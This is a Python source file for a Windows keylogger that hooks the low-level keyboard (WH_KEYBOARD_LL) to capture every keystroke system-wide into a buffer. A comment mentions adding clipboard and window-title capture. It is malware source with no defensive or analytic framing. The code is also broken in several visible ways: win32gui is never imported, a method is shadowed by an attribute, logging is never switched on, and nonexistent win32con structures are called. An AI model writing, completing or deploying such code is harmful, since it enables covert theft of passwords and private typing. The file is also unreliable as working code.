import threading
import ctypes
import win32api
import win32con

class Keylogger:
    def __init__(self):
        self.is_logging = False
        self.hook = None
        self.buffer = bytearray()

    def is_logging(self):
        return self.is_logging

    def flush_buffer(self, length):
        if not self.is_logging:
            return None
        new_buffer = self.buffer[:length].decode('utf-8')
        self.buffer = bytearray()
        return new_buffer

    def free_flush_buffer_result(self, data):
        if data:
            data.decode('utf-8')

    def write_log(self, key, length):
        if length > 0:
            self.buffer.extend(key.encode('utf-8'))

    def easytolower(self, in_char):
        if 'A' <= in_char <= 'Z':
            return chr(ord(in_char) + ord('a') - ord('A'))
        return in_char

    def shift_modifier(self):
        return False

    def key_event(self, n_code, w_param, l_param):
        if n_code == win32con.HC_ACTION and (w_param == win32con.WM_SYSKEYDOWN or w_param == win32con.WM_KEYDOWN):
            kb_hook = win32con.KBDLLHOOKSTRUCT(l_param)
            sz_key = win32api.GetKeyNameTextA(kb_hook.dwMsg, 256)
            # getClipBoard(); //we don't need this shit for now do we?no
            # getWindowTitle();

            self.shift_modifier = sz_key == "Shift"
            use_prefix = self.shift_modifier or sz_key == "Shift" or win32api.GetAsyncKeyState(win32con.VK_LSHIFT) or win32api.GetAsyncKeyState(win32con.VK_RSHIFT)

            if sz_key == "Space":
                if not (win32api.GetAsyncKeyState(win32con.VK_LMENU) or win32api.GetAsyncKeyState(win32con.VK_LCONTROL) or win32api.GetAsyncKeyState(win32con.VK_RMENU) or win32api.GetAsyncKeyState(win32con.VK_RCONTROL)):
                    sz_key = " "

            if sz_key == "Enter":
                sz_key = "[Enter]\n"

            if sz_key!= "Backspace":
                sz_key += "\n"

            if use_prefix:
                sz_key = "Shift+" + sz_key

            self.write_log(sz_key, len(sz_key))
        return win32gui.CallNextHookEx(self.hook, n_code, w_param, l_param)

    def msg_loop(self):
        while self.is_logging:
            message = win32gui.GetMessage(None, None, 0, 0)
            if message:
                win32gui.TranslateMessage(message)
                win32gui.DispatchMessage(message)

    def start_logger(self):
        self.hook = win32gui.SetWindowsHookEx(win32con.WH_KEYBOARD_LL, self.key_event, None, 0)
        self.msg_loop()

    def stop_logger(self):
        if not self.is_logging:
            return
        self.is_logging = not win32gui.UnhookWindowsHookEx(self.hook)

def main():
    keylogger = Keylogger()
    threading.Thread(target=keylogger.start_logger).start()

if __name__ == "__main__":
    main()
